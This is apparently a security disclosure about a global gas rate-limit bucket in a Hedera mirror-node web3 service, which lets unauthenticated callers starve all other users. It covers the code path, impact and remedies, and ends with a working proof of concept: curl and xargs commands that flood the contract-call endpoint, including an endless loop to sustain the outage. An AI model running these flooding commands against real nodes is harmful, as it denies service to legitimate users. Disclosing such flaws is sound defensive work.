### Title
Global Gas-Bucket Singleton Enables Unauthenticated Sustained Denial-of-Service via Concurrent High-Gas Request Flooding

### Summary
The `gasLimitBucket` bean in `ThrottleConfiguration.java` is a single application-scoped singleton shared across every thread and every caller with no per-user or per-IP partitioning. An unprivileged attacker can flood the endpoint with concurrent high-gas requests, consuming all 750,000 scaled tokens (representing 7.5 B gas) before any restore callback fires, keeping the bucket perpetually empty and blocking every other user from executing contract calls or token transfers for as long as the flood continues.

### Finding Description

**Code path:**

`ThrottleConfiguration.gasLimitBucket()` (lines 34–45) creates one `Bucket` for the entire JVM:

```java
// ThrottleConfiguration.java:34-45
@Bean(name = GAS_LIMIT_BUCKET)
Bucket gasLimitBucket() {
    long gasLimit = throttleProperties.getGasPerSecond();   // default 750_000 scaled tokens
    final var limit = Bandwidth.builder()
            .capacity(gasLimit)
            .refillGreedy(gasLimit, Duration.ofSeconds(1))
            .build();
    return Bucket.builder()
            .withSynchronizationStrategy(SynchronizationStrategy.SYNCHRONIZED)
            .addLimit(limit)
            .build();
}
```

`ThrottleManagerImpl.throttle()` (lines 37–42) deducts tokens **before** execution:

```java
} else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
}
```

`ContractCallService.restoreGasToBucket()` (lines 140–151) adds tokens back **only after** execution completes in the `finally` block. During the entire execution window the tokens are gone from the bucket.

**Root cause and failed assumption:**

The design assumes that the restore callback fires fast enough to keep the bucket from being drained by concurrent in-flight requests. This assumption fails under concurrent load. With the default `requestsPerSecond = 500` and `gasPerSecond = 7_500_000_000` (750,000 scaled tokens), a single attacker sending 500 concurrent requests each with `gas = 15_000_000` (1,500 scaled tokens) consumes `500 × 1,500 = 750,000` tokens — the entire bucket — before any of those requests finish executing. `ContractCallRequest` enforces `@Min(21_000)` on `gas` but **no `@Max`**, so the attacker can also use `gas` values up to `gasPerSecond` (7.5 B) to drain the bucket in a single request.

There is no per-IP, per-account, or per-connection gas accounting anywhere in the throttle stack (`ThrottleManagerImpl`, `ThrottleProperties`, `RequestProperties`). The `rateLimitBucket` is equally global and does not prevent one caller from consuming all 500 allowed requests per second.

### Impact Explanation
Every `eth_call` and `eth_estimateGas` request from every legitimate user is rejected with HTTP 429 "Gas per second rate limit exceeded" for the duration of the attack. Token transfers and contract calls that rely on gas estimation or simulation are completely blocked. The bucket refills every second, but the attacker can re-drain it within the same second, making the outage continuous. Because the mirror node is the canonical read/simulate layer for wallets and dApps, this effectively freezes all user-facing EVM interactions on the node.

### Likelihood Explanation
No authentication, API key, or privileged access is required. Any anonymous HTTP client can reach the `/api/v1/contracts/call` endpoint. The attack requires only a standard HTTP client capable of issuing ~500 concurrent requests per second — trivially achievable with `curl`, `wrk`, `ab`, or any async HTTP library. The attacker does not need to know any contract address or calldata; a minimal valid request body with a high `gas` value suffices. The attack is fully repeatable and can be sustained indefinitely at negligible cost.

### Recommendation
1. **Per-caller gas accounting**: Partition the gas bucket by source IP (or API key if authentication is added). Bucket4j supports distributed and keyed buckets; use a `Map<String, Bucket>` keyed on the remote address, or integrate with a proxy-level rate limiter (e.g., Nginx, Envoy) that enforces per-IP gas quotas.
2. **Cap `gas` per request**: Add `@Max` on `ContractCallRequest.gas` (e.g., capped at the Hedera per-transaction gas limit, ~15 M) to prevent a single request from consuming a disproportionate share of the bucket.
3. **Reduce the concurrent-window exposure**: Move `tryConsume` to consume only `scaleGas(actualGasUsed)` after execution rather than `scaleGas(gasLimit)` before, or use a reservation/probe pattern so that over-estimated gas is never deducted from the shared pool.
4. **Separate the global guard from per-user enforcement**: Keep the global bucket as a hard ceiling but add a per-IP token bucket as a first gate so one source cannot exhaust the global budget.

### Proof of Concept

**Preconditions:** Unauthenticated access to the web3 endpoint. Default configuration (`gasPerSecond = 7_500_000_000`, `requestsPerSecond = 500`).

**Step 1 – Drain the bucket with concurrent requests:**
```bash
# Send 500 concurrent requests each with gas=15000000 (1500 scaled tokens × 500 = 750000 = full bucket)
seq 500 | xargs -P500 -I{} curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST http://<mirror-node>/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"to":"0x0000000000000000000000000000000000000167","gas":15000000,"data":"0x"}'
```

**Step 2 – Observe victim requests being rejected:**
```bash
curl -X POST http://<mirror-node>/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"to":"0x0000000000000000000000000000000000000167","gas":21000,"data":"0x"}'
# Returns HTTP 429: {"_status":{"messages":[{"message":"Gas per second rate limit exceeded."}]}}
```

**Step 3 – Sustain the DoS:**
```bash
# Loop the drain continuously; bucket refills every ~1 s but is immediately re-drained
while true; do
  seq 500 | xargs -P500 -I{} curl -s -o /dev/null \
    -X POST http://<mirror-node>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0x0000000000000000000000000000000000000167","gas":15000000,"data":"0x"}'
done
```

All legitimate users receive 429 responses for the duration of the loop. No credentials, tokens, or special knowledge are required.
